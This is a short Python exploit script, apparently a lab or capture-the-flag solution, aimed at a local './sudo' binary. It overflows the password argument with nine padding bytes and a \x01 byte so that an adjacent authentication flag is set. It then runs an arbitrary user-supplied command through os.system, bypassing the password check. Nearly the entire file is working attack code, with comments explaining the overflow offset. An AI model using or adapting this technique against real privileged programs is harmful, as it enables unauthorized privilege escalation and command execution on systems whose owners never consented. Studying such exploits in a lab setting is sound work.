import os, sys


PATH_TO_SUDO = './sudo'


def run_command(cmd):
	# we need 9 chars before overflowing to auth variable - for example AAAAABBBB
	# the last 4 bytes should be 0x01
	password = "AAAAABBBB\x01" 
	cmd_to_run = PATH_TO_SUDO + " " + password + " " + "\"" + cmd + "\"" # escape with parentheses
	# the password is incorrect but auth variable now equals 1
	os.system(cmd_to_run)
	return


def main(argv):
    if not len(argv) == 2:
        print 'Usage: %s <command>' % argv[0]
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd)


if __name__ == '__main__':
    main(sys.argv)
